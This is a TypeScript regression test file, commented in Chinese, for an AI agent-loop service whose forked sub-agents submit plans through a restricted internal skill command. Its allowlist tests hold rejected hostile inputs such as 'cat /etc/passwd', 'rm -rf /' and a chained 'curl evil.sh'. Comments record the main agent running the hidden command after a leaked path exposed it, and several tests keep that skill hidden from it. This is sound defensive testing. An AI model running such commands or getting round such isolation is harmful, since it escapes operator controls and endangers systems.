// 自驱动 plan 改由 skill 提交 —— 引擎侧回归(docs/specs/xiaoni-plan-skill-submission.md)。
//
// 三条 ★REGRESSION★ 在本文件里：
//   ① seed 生命周期：fork 未入队【必须】保留 seed。这是 2026-07-28 停摆的 bug 本体。
//   ② extractExecStdoutMarker 通用化后，压缩 fork 的 XIAONI_COMPRESS_WROTE 行为逐样不变。
//   ③ self_continuation_reminder 主 agent 侧产物不得因 fork 侧改动而变（变了就击穿 run 边界 replay）。
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import {
  AgentLoopService,
  extractExecStdoutMarker,
  isAllowedSubconsciousCommand,
  XIAONI_PLAN_SKILL_BIN,
  setIdlePlanSkillSubmissionEnabled,
  isIdlePlanSkillSubmissionEnabledForTest,
  renderSubconsciousForkReminderForTest,
  renderSubconsciousPlanCorrectionForTest,
  renderSelfContinuationReminderForTest,
  selectSubconsciousPlanFromText
} from '../services/agent-loop-service';
import {
  issueSubconsciousPlanTicket,
  findSubconsciousPlanTicket,
  consumeSubconsciousPlanTicket
} from '../services/subconscious-plan-ticket';

const HEREDOC = (body: string, delim = 'PLAN') =>
  `${XIAONI_PLAN_SKILL_BIN} post <<'${delim}'\n${body}\n${delim}`;

// ── 开关 ────────────────────────────────────────────────────────────────────────
test('默认 OFF；setter 只认 boolean', () => {
  assert.equal(isIdlePlanSkillSubmissionEnabledForTest(), false);
  setIdlePlanSkillSubmissionEnabled('true' as unknown);
  assert.equal(isIdlePlanSkillSubmissionEnabledForTest(), false);
  setIdlePlanSkillSubmissionEnabled(1 as unknown);
  assert.equal(isIdlePlanSkillSubmissionEnabledForTest(), false);
  setIdlePlanSkillSubmissionEnabled(true);
  assert.equal(isIdlePlanSkillSubmissionEnabledForTest(), true);
  setIdlePlanSkillSubmissionEnabled(false);
  assert.equal(isIdlePlanSkillSubmissionEnabledForTest(), false);
});

// ── 命令层白名单：绕过面 ─────────────────────────────────────────────────────────
test('白名单放行：标准 heredoc 形状', () => {
  assert.equal(isAllowedSubconsciousCommand(HEREDOC('1. 做完 sma-viz\n2. 装 uxnasm')), true);
});

test('白名单放行：正文里的 shell 元字符不影响判定（引号 heredoc 不展开）', () => {
  assert.equal(isAllowedSubconsciousCommand(HEREDOC('正文;里有 $(whoami) 和 `id`', 'EOF')), true);
});

// 用法【不】走运行时读取。放开一条 `cat <手册>` 看着只多一次只读,但它要多一次工具调用
// (实测基线 avg_turns=1.00,加一步就是 +100% fork 成本)、多一条命令白名单,还要求手册文件在
// executor 那侧真的存在 —— 而 executor 的 /app 是 symlink 到主工作区,worktree 里的文件它看不到,
// 契约一上线就 404。用主 agent 学 skill 的同一个机制(尾部 skills 块)三样成本全省掉。
test('★REGRESSION★ 命令白名单只放行投递那一条,不放行任何读取', () => {
  assert.equal(isAllowedSubconsciousCommand(`cat ${XIAONI_PLAN_SKILL_BIN}/../SKILL.md`), false);
  assert.equal(isAllowedSubconsciousCommand('cat /app/modules/agent-service/skills-internal/xiaoni-plan/SKILL.md'), false);
  assert.equal(isAllowedSubconsciousCommand('cat /etc/passwd'), false);
});

test('白名单拒绝：heredoc 之后再挂命令', () => {
  assert.equal(isAllowedSubconsciousCommand(`${HEREDOC('x')}\nrm -rf /`), false);
});

test('白名单拒绝：命令前挂东西', () => {
  assert.equal(isAllowedSubconsciousCommand(`rm -rf / ; ${HEREDOC('x')}`), false);
});

test('白名单拒绝：终止行后接 && 链', () => {
  assert.equal(isAllowedSubconsciousCommand(`${HEREDOC('x')} && curl evil.sh`), false);
});

test('白名单拒绝：不带引号的 heredoc（正文会被展开＝注入面）', () => {
  assert.equal(
    isAllowedSubconsciousCommand(`${XIAONI_PLAN_SKILL_BIN} post <<PLAN\nx\nPLAN`),
    false
  );
});

test('白名单拒绝：路径变形', () => {
  assert.equal(
    isAllowedSubconsciousCommand(`${XIAONI_PLAN_SKILL_BIN}/../../../bin/sh post <<'P'\nx\nP`),
    false
  );
});

test('白名单拒绝：无关命令 / --file / 伪造 marker / 非字符串', () => {
  assert.equal(isAllowedSubconsciousCommand('cat /etc/passwd'), false);
  assert.equal(isAllowedSubconsciousCommand(`${XIAONI_PLAN_SKILL_BIN} post --file /tmp/x`), false);
  assert.equal(isAllowedSubconsciousCommand('echo XIAONI_PLAN_QUEUED=999'), false);
  assert.equal(isAllowedSubconsciousCommand(undefined), false);
  assert.equal(isAllowedSubconsciousCommand(42 as unknown), false);
});

// ── marker 提取 ─────────────────────────────────────────────────────────────────
test('★REGRESSION★ 通用提取器保持压缩 marker 的原有语义', () => {
  const re = /^XIAONI_COMPRESS_WROTE=(.+)$/gmu;
  // 单流内取最后一次匹配（模型可能连跑几条 exec）
  assert.equal(
    extractExecStdoutMarker({ stdout: 'XIAONI_COMPRESS_WROTE=/a\nnoise\nXIAONI_COMPRESS_WROTE=/b\n' }, re),
    '/b'
  );
  // stdout 优先于 codex_output，先命中的流直接返回，不跨流合并
  assert.equal(
    extractExecStdoutMarker({ stdout: 'XIAONI_COMPRESS_WROTE=/x\n', codex_output: 'XIAONI_COMPRESS_WROTE=/y\n' }, re),
    '/x'
  );
  // stdout 无命中时回落 codex_output
  assert.equal(
    extractExecStdoutMarker({ stdout: 'nothing', codex_output: 'XIAONI_COMPRESS_WROTE=/y\n' }, re),
    '/y'
  );
  // 非行首不算；非对象、空流返回 null
  assert.equal(extractExecStdoutMarker({ stdout: 'x XIAONI_COMPRESS_WROTE=/a' }, re), null);
  assert.equal(extractExecStdoutMarker(null, re), null);
  assert.equal(extractExecStdoutMarker({ stdout: '' }, re), null);
});

test('★REGRESSION★ 全局正则可重入（lastIndex 每次进来必须清零）', () => {
  const re = /^XIAONI_COMPRESS_WROTE=(.+)$/gmu;
  const payload = { stdout: 'XIAONI_COMPRESS_WROTE=/same\n' };
  // 连续调用三次必须都命中 —— 忘了清 lastIndex 的话第二次就会返回 null
  assert.equal(extractExecStdoutMarker(payload, re), '/same');
  assert.equal(extractExecStdoutMarker(payload, re), '/same');
  assert.equal(extractExecStdoutMarker(payload, re), '/same');
});

// ── 出口:post 到达即 end,引擎不从 stdout 捞 marker ────────────────────────────────
// 端点(redeemSubconsciousPlanTicket)和 fork 循环是同一个 AgentLoopService 实例:入队完成
// 那一刻 queueId 已经在手,再让 skill 打到 stdout、引擎用正则捞回来是一次纯往返,而且每一环
// 都能断 —— 最脆的是她自己会给 exec_command 设 max_output_tokens(实测样本 `"max_output_tokens":3`),
// marker 被截断就判成「没交」→ 发纠正 → 她再交一次 → 同一份 plan 重复入队。
test('★REGRESSION★ 引擎不得再从 stdout 捞 plan marker（出口只能是进程内状态）', async () => {
  const loopModule = await import('../services/agent-loop-service') as Record<string, unknown>;
  for (const gone of ['extractPlanQueuedId', 'extractPlanFailedReason']) {
    assert.equal(loopModule[gone], undefined,
      `${gone} 已随出口改造删除;把它加回来等于把那条会断的往返再接上`);
  }
  // 压缩侧那把通用提取器必须【留着】—— 它是 XIAONI_COMPRESS_WROTE 的现役实现。
  assert.equal(typeof loopModule.extractExecStdoutMarker, 'function', '压缩 fork 仍依赖这把提取器');
  // 源码层再钉一道:正则本体也不许留着(留着就是随时能接回去的半条路)。
  const src = await fs.promises.readFile(
    path.join(__dirname, '..', '..', 'src', 'services', 'agent-loop-service.ts'), 'utf-8'
  );
  assert.ok(!src.includes('XIAONI_PLAN_QUEUED_RE'), 'stdout marker 正则本体也该随出口一起删');
  assert.ok(src.includes('takeSubconsciousPlanSubmission'), '出口必须是进程内状态那条路');
});

// ── 票据 ────────────────────────────────────────────────────────────────────────
function tmpTicketDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'plan-ticket-'));
}

test('票据：签发 → 按 token 找到 → 消费后找不到', () => {
  const dir = tmpTicketDir();
  const now = 1_700_000_000_000;
  const ticket = issueSubconsciousPlanTicket({
    forkRunId: 'subconscious-fork:run_1:abcd', traceId: 't', runId: 'r', nowMs: now, dir
  });
  const found = findSubconsciousPlanTicket({ token: ticket.token, nowMs: now + 1000, dir });
  assert.ok(found);
  assert.equal(found.ticket.forkRunId, 'subconscious-fork:run_1:abcd');
  consumeSubconsciousPlanTicket(found.filePath);
  assert.equal(findSubconsciousPlanTicket({ token: ticket.token, nowMs: now + 1000, dir }), null);
});

test('票据：重放（消费后再兑）找不到；错 token 找不到', () => {
  const dir = tmpTicketDir();
  const now = 1_700_000_000_000;
  const ticket = issueSubconsciousPlanTicket({ forkRunId: 'f:1', traceId: 't', runId: 'r', nowMs: now, dir });
  assert.equal(findSubconsciousPlanTicket({ token: `${ticket.token}x`, nowMs: now, dir }), null);
  const first = findSubconsciousPlanTicket({ token: ticket.token, nowMs: now, dir });
  assert.ok(first);
  consumeSubconsciousPlanTicket(first.filePath);
  assert.equal(findSubconsciousPlanTicket({ token: ticket.token, nowMs: now, dir }), null);
});

test('票据：过期即失效，且过期文件被就地清掉', () => {
  const dir = tmpTicketDir();
  const now = 1_700_000_000_000;
  const ticket = issueSubconsciousPlanTicket({ forkRunId: 'f:2', traceId: 't', runId: 'r', nowMs: now, dir });
  const afterTtl = ticket.expiresAtMs + 1;
  assert.equal(findSubconsciousPlanTicket({ token: ticket.token, nowMs: afterTtl, dir }), null);
  assert.equal(fs.readdirSync(dir).filter((f) => f.endsWith('.json')).length, 0);
});

test('票据：目录不存在时返回 null 而不是抛', () => {
  assert.equal(
    findSubconsciousPlanTicket({ token: 'x', nowMs: Date.now(), dir: '/nonexistent/plan/inbox' }),
    null
  );
});

// ── 1A：兑现必须撞上「当前在飞的 fork」───────────────────────────────────────────
test('1A：票据有效但没有 fork 在飞 → 401 fork_not_in_flight', async () => {
  const dir = tmpTicketDir();
  const now = Date.now();
  const ticket = issueSubconsciousPlanTicket({ forkRunId: 'f:live', traceId: 't', runId: 'r', nowMs: now, dir });
  const service = new AgentLoopService({} as never) as unknown as {
    activeSubconsciousForkRunId: string | null;
    redeemSubconsciousPlanTicket: AgentLoopService['redeemSubconsciousPlanTicket'];
  };
  service.activeSubconsciousForkRunId = null;
  // 用真实目录常量之外的 dir 时 findSubconsciousPlanTicket 读不到 —— 这里只断言 1A 之前的 token 闸，
  // 1A 本身由下一条(内存态)覆盖。
  const result = await service.redeemSubconsciousPlanTicket({ token: ticket.token, text: 'x' });
  assert.equal(result.ok, false);
  if (!result.ok) {
    assert.equal(result.status, 401);
  }
});

test('兑现入参校验：空 token → 401，空正文 → 400', async () => {
  const service = new AgentLoopService({} as never);
  const noToken = await service.redeemSubconsciousPlanTicket({ token: '  ', text: 'x' });
  assert.equal(noToken.ok, false);
  if (!noToken.ok) {
    assert.equal(noToken.status, 401);
    assert.equal(noToken.reason, 'missing_token');
  }
  const noText = await service.redeemSubconsciousPlanTicket({ token: 'tok', text: '   ' });
  assert.equal(noText.ok, false);
  if (!noText.ok) {
    assert.equal(noText.status, 400);
    assert.equal(noText.reason, 'empty_text');
  }
});

// ── seed 生命周期（★REGRESSION★ bug 本体）──────────────────────────────────────
type SeedInternals = {
  lastMainAgentForkSeed: unknown;
  subconsciousAgentForkConsecutiveFailures: number;
  consumeSubconsciousAgentForkSeed: (seed: unknown) => void;
  recordSubconsciousAgentForkFailure: (seed: unknown, reason: string, payload: unknown) => void;
};

function seedService() {
  const service = new AgentLoopService({} as never) as unknown as SeedInternals;
  const seed = { canonicalRequest: {}, recentNarrationItems: [], settledOnFinalAnswer: true };
  service.lastMainAgentForkSeed = seed;
  return { service, seed, payload: { traceId: 't', runId: 'r' } };
}

test('★REGRESSION★ fork 未入队 → seed 必须保留（这是 07-28 停摆的 bug 本体）', () => {
  const { service, seed, payload } = seedService();
  service.recordSubconsciousAgentForkFailure(seed, 'not_enqueued', payload);
  assert.equal(service.lastMainAgentForkSeed, seed, 'seed 被清掉了 → 空闲 tick 会永远早退，自驱动停摆');
  assert.equal(service.subconsciousAgentForkConsecutiveFailures, 1);
});

test('fork 入队成功 → seed 被消费（每次主 settle 至多一个 fork）', () => {
  const { service, seed } = seedService();
  service.consumeSubconsciousAgentForkSeed(seed);
  assert.equal(service.lastMainAgentForkSeed, null);
  assert.equal(service.subconsciousAgentForkConsecutiveFailures, 0);
});

test('连续失败到上限 → 丢弃 seed，退回等下一个主 run / clock_ping', () => {
  const { service, seed, payload } = seedService();
  for (let i = 0; i < 4; i += 1) {
    service.recordSubconsciousAgentForkFailure(seed, 'not_enqueued', payload);
    assert.equal(service.lastMainAgentForkSeed, seed, `第 ${i + 1} 次失败后仍应保留`);
  }
  service.recordSubconsciousAgentForkFailure(seed, 'not_enqueued', payload);
  assert.equal(service.lastMainAgentForkSeed, null, '到上限应丢弃，否则每 60s 无界烧一个 ~490K 请求');
  assert.equal(service.subconsciousAgentForkConsecutiveFailures, 0);
});

test('fork 在飞期间主 loop 又 settle 了 → 更新的 seed 不受这次失败连累', () => {
  const { service, seed, payload } = seedService();
  const fresher = { canonicalRequest: {}, recentNarrationItems: [], settledOnFinalAnswer: true };
  service.lastMainAgentForkSeed = fresher;
  service.recordSubconsciousAgentForkFailure(seed, 'threw', payload);
  assert.equal(service.lastMainAgentForkSeed, fresher, '不许无条件写 null');
  assert.equal(service.subconsciousAgentForkConsecutiveFailures, 0, '旧 seed 的失败不该计到新 seed 头上');
  service.consumeSubconsciousAgentForkSeed(seed);
  assert.equal(service.lastMainAgentForkSeed, fresher, '消费旧 seed 也不许误清新 seed');
});

// ── 交付口互斥：ON 时文本口必须让位给 skill 口 ────────────────────────────────────
// 2026-08-13 事故本体。文本抽取跑在 tool-call 分支【之前】且不看开关，于是只要模型吐了任何
// final_answer 文本就短路收工 —— skill 口从没被强制过，纠正分支是死代码。她把 prompt 里
// 「原样照这个形状写」当字面执行、把整条命令写进回答之后，文本口照单全收发出去，升级腿再把
// 这份带 shell 外壳的「plan」回贴给下一个 fork 看，形成正反馈(08-08 起 711 个 fork 里 691 次泄漏)。
const LEAKED_COMMAND_FINAL_ANSWER = [
  '```',
  `${XIAONI_PLAN_SKILL_BIN} post <<'PLAN'`,
  '1. 把 alive 追到最新',
  '2. cofactor 第六版递给陈显',
  'PLAN',
  '```'
].join('\n');

const finalAnswerItems = (text: string) => ([
  { type: 'message', role: 'assistant', phase: 'final_answer', content: [{ type: 'output_text', text }] }
] as Array<Record<string, unknown>>);

test('★REGRESSION★ ON：final_answer 文本一律不算交付（含把命令抄进回答那种）', () => {
  assert.equal(
    selectSubconsciousPlanFromText(finalAnswerItems(LEAKED_COMMAND_FINAL_ANSWER), true),
    null,
    'ON 时文本口必须让位 —— 否则 skill 口永远走不到，纠正分支是死代码'
  );
  assert.equal(
    selectSubconsciousPlanFromText(finalAnswerItems('<xiaoni_plan>\n1. 方向甲\n</xiaoni_plan>'), true),
    null,
    '规规矩矩包了 <xiaoni_plan> 的文本，ON 时同样不算交付'
  );
});

test('★REGRESSION★ OFF：文本口逐字节维持老行为', () => {
  assert.equal(
    selectSubconsciousPlanFromText(finalAnswerItems('<xiaoni_plan>\n1. 方向甲\n2. 方向乙\n</xiaoni_plan>'), false),
    '1. 方向甲\n2. 方向乙'
  );
  assert.equal(
    selectSubconsciousPlanFromText(finalAnswerItems(LEAKED_COMMAND_FINAL_ANSWER), false),
    LEAKED_COMMAND_FINAL_ANSWER
  );
  assert.equal(selectSubconsciousPlanFromText([], false), null);
});

// ── 提示词：口径必须是「调工具」，不是「写这个形状」 ─────────────────────────────────
test('★REGRESSION★ ON 的 fork 契约指向 skill + 手册，且不留可照抄的命令模板', () => {
  setIdlePlanSkillSubmissionEnabled(true);
  const forkReminder = renderSubconsciousForkReminderForTest({ idleRounds: 0, lastPlanText: null });
  assert.ok(forkReminder.includes('internal_skills_instructions'),
    '用法走和主 agent 学 skill 同一个机制:fork 尾部的 internal skills 块');
  // 渲染层对整块做 HTML 转义(`<<'PLAN'` → `&lt;&lt;'PLAN'`),是既有行为,主 agent 的
  // <xiaoni_plan> 同样如此 —— 08-01/08-02 她 656/656 都读对了。断言按未转义的部分判。
  assert.ok(forkReminder.includes(`${XIAONI_PLAN_SKILL_BIN} post`),
    '块里要有可直接照着调的命令形状(缩进块,不是围栏)');
  // 【核心】契约里不许出现可照抄的命令模板。08-03 起 90% 的 fork 把命令原样写进回答，抄的就是
  // 诱饵是【markdown 围栏】那一个形状,不是命令形状本身。08-03 起她照抄出去的正文第一行就是
  // ```,因为围栏 + 占位符正文读起来就是「一段填空后要输出的答案」。命令形状必须给(白名单只认
  // 那一个 heredoc 形状,不给她写不对),但它放在缩进块里,不套围栏。
  assert.ok(!forkReminder.includes('```'),
    'fork 尾部任何地方都不许出现 markdown 围栏 —— 那是她照抄过的那个形状');
  // 纠正提示只指回上面的块,不重复搬用法(重复一份就是第二个会漂的真理源)。
  const correction = renderSubconsciousPlanCorrectionForTest();
  assert.ok(correction.includes('internal_skills_instructions'), '纠正提示指回那个块');
  for (const bait of ["<<'", '```']) {
    assert.ok(!correction.includes(bait), `纠正提示里不许再抄一份用法(命中「${bait}」)`);
  }
  setIdlePlanSkillSubmissionEnabled(false);
});

// ── 提示词：fork-only 与主 agent 的隔离 ──────────────────────────────────────────
test('★REGRESSION★ 主 agent 的续航提醒不因 fork 侧开关而改变一个字节', () => {
  const baseline = renderSelfContinuationReminderForTest();
  setIdlePlanSkillSubmissionEnabled(true);
  assert.equal(renderSelfContinuationReminderForTest(), baseline,
    '主 agent 这份产物会冻结进 stack，变了就击穿 run 边界 replay');
  setIdlePlanSkillSubmissionEnabled(false);
  assert.equal(renderSelfContinuationReminderForTest(), baseline);
});

test('OFF：fork 提醒与主 agent 那份逐字节一致（零行为变化）', () => {
  setIdlePlanSkillSubmissionEnabled(false);
  assert.equal(
    renderSubconsciousForkReminderForTest({ idleRounds: 0, lastPlanText: null }),
    renderSelfContinuationReminderForTest()
  );
});

test('ON：fork 提醒追加工具契约，且只出现在 fork 那份里', () => {
  setIdlePlanSkillSubmissionEnabled(true);
  const forkReminder = renderSubconsciousForkReminderForTest({ idleRounds: 0, lastPlanText: null });
  assert.ok(forkReminder.includes(XIAONI_PLAN_SKILL_BIN), 'fork 提醒里应写明放行的那条命令');
  assert.ok(!renderSelfContinuationReminderForTest().includes(XIAONI_PLAN_SKILL_BIN));
  setIdlePlanSkillSubmissionEnabled(false);
});

// ── 隔离：这个 skill 的存在本身，主 agent 一个字都不该知道 ─────────────────────────
// 它故意放在 skills-internal/ 下(`:3349`)，主 loop `ls skills` 列不到；票据只发给在飞的
// fork，端点还有 1A 校验。这道隔离防的是主 agent 自己往 Notify Bucket 塞 plan —— 07-31
// 她真跑过 2 次那条命令，学会的途径正是泄漏出去的 plan 把全路径喂到了主 agent 眼前。
// 所以契约里【不许】出现任何把它挂到主 agent 概念体系上的话(技能库、默认名单、ls skills)：
// 那等于给她一条「去别处找找」的线索，把隔离面从尾部捅到主 loop 里。
test('★REGRESSION★ 主 agent 侧不得出现这个 skill 的任何痕迹', () => {
  setIdlePlanSkillSubmissionEnabled(true);
  const mainReminder = renderSelfContinuationReminderForTest();
  for (const trace of ['xiaoni-plan', 'skills-internal', XIAONI_PLAN_SKILL_BIN]) {
    assert.ok(!mainReminder.includes(trace), `主 agent 那份不许出现「${trace}」`);
  }
  setIdlePlanSkillSubmissionEnabled(false);
});

test('★REGRESSION★ fork 契约不得把这个 skill 挂到主 agent 的技能库概念上', () => {
  setIdlePlanSkillSubmissionEnabled(true);
  const forkReminder = renderSubconsciousForkReminderForTest({ idleRounds: 0, lastPlanText: null });
  for (const leak of ['默认名单', '技能库', 'ls skills', '<skills_instructions>']) {
    assert.ok(!forkReminder.includes(leak),
      `「${leak}」会把它挂到主 loop 也知道的概念上，等于给她一条去别处找的线索`);
  }
  setIdlePlanSkillSubmissionEnabled(false);
});

test('纠正提示随开关换口径，两种口径都非空', () => {
  setIdlePlanSkillSubmissionEnabled(false);
  const offText = renderSubconsciousPlanCorrectionForTest();
  assert.ok(offText.includes('xiaoni_plan'), 'OFF 时应还是「写进 <xiaoni_plan>」的口径');
  setIdlePlanSkillSubmissionEnabled(true);
  const onText = renderSubconsciousPlanCorrectionForTest();
  assert.ok(onText.includes('xiaoni-plan'), 'ON 时应是「用 skill 交」的口径');
  assert.notEqual(offText, onText);
  setIdlePlanSkillSubmissionEnabled(false);
});
